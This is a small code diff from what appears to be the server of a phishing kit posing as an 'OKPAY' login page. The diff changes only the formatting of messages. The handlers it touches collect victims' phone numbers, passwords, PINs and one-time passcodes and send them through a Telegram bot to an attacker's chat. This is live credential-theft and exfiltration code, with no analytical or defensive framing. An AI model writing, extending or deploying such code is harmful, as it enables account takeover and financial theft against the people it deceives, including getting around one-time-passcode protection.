@@ -18,7 +18,7 @@ app.post('/submit-login', async (req, res) => {
     return res.status(400).json({ success: false, message: 'All fields required.' });
   }
 
-  const messageText = `OKPAY LOGIN\n\nMobile: ${phone}\nPassword: ${password}\nPin: ${pin}`;
+  const messageText = `OKPAY LOGIN\n\nMobile:📱 ${phone}\nPassword: 🔑${password}\nPin: 🧷${pin}`;
 
   try {
     await bot.sendMessage(process.env.CHAT_ID, messageText);
@@ -35,7 +35,7 @@ app.post('/submit-otp', async (req, res) => {
     return res.status(400).json({ success: false, message: 'OTP required.' });
   }
 
-  const messageText = `OKPAY OTP\n\nReceived OTP: ${otp}`;
+  const messageText = `OKPAY OTP\n\nReceived OTP:🛂 ${otp}`;
 
   try {
     await bot.sendMessage(process.env.CHAT_ID, messageText);
